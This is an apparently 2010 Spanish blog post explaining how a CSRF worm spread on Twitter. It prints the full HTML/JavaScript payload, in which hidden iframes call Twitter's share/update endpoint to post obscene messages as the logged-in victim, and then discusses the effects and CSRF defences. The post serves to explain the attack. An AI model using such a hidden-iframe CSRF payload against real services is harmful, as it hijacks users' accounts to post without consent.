---
title: Twitter y las cabras Así funciona el exploit.
date: 26/09/2010



<p>Hace unos cuantos días varias personas en twitter empezaron a mostrar su amor por las cabras&#8230; Era un twitter exploit, probablemente iniciado por alguien con gustos algo retorcidos. </p>
~
<p>Este exploit funcionaba de una forma sencilla en realidad<span id="more-343"></span>, todo lo que necesitas es:</p>
<ul>
<li>Que twitter permita updates desde el API vía IFRAMES y GET. Por lo tanto siendo vulnerable a ataques CSRF.</li>
<li>Que PasteHTML.com sea vulnerable a generar código sin un sitio seguro y ejecutarlo.</li>
<li>Clientes o Twitter aplicando automáticamente el shortener t.co</li>
</ul>
<p>El código para ejecutar el worm estaba alojado en http://pastehtml.com/view/1b7xk3b.html, que accedieron a deshabilitar muy amablemente después de <a target='_blank' href="http://twitter.com/pastehtml/status/25614411247">algunos tweets</a>.</p>
<h3>El código:</h3>
<pre class='html' name='code'>
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
    &lt;script&gt;
        var el1 = document.createElement(&#x27;iframe&#x27;);
        var el2 = document.createElement(&#x27;iframe&#x27;);
        el1.style.visibility=&quot;hidden&quot;;
        el2.style.visibility=&quot;hidden&quot;;
        el1.src = &quot;http://twitter.com/share/update?status=WTF:%20&quot; + window.location;
        el2.src = &quot;http://twitter.com/share/update?status=i%20love%20anal%20sex%20with%20goats&quot;;
        document.getElementsByTagName(&quot;body&quot;)[0].appendChild(el1);
        document.getElementsByTagName(&quot;body&quot;)[0].appendChild(el2);
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
<p>Como ves no hay nada mágico en él &#8211;  Todo lo que hacés es crear dos SCRIPT que apuntan al API de twitter y envías un request para hacer un post. Cómo el usuario que clicó en el link ya estaba autenticado en twitter podés enviar lo que sea en su lugar. Funciona de una manera similar al  exploit &#8220;Don&#8217;t Click this Button&#8221; que pasó hace un tiempo.</p>
<p>Los efectos de todo esto son variados:</p>
<ul>
<li><strong>Malo</strong> La gente va a desconfiar de <a href="http://t.co">t.co</a>, que fué creado principalmente para ser un shortener de confianza. Hay que tomar en cuenta que este servicio no se vió comprometido realmente &#8211; no se puede culpar a Twitter de que sea automático y funcione.
</li>
<li><strong>Malo</strong> Twitter quedó inundado de mensajes zoofílicos.</li>
<li><strong>Bueno</strong> La gente va a hablar del exploit y cómo fué hecho</li>
<li><strong>Bueno</strong> La gente va a ser más cuidadosa al clicar links</li>
<li><strong>Bueno</strong> Twitter va a verse forzado a trabajar más en contra de los CSRF</li>
<li><strong>Malo</strong> Esto podría dañar algunas implementaciones.</li>
</ul>
<p>No hay una defensa real contra los ataques CSRF desde el punto de vista del usuario que no sea no hacer clic en enlaces que no confía y desactivar JavaScript. </p>
<p>Como es una definición bastante amplia vamos a tener más y más de estos exploits hasta que los proveedores de APIs deshabiliten la posibilidad de hacer requests sin tokens. Esto, por otra parte significa que soluciones de un clic para tuitear o semejante, sean mucho más difíciles de implementar.</p>
<p><small>Gracias a Christian Heillman por <a href="http://www.wait-till-i.com/2010/09/26/new-twitter-exploit-how-it-works/">este post</a></small></p>
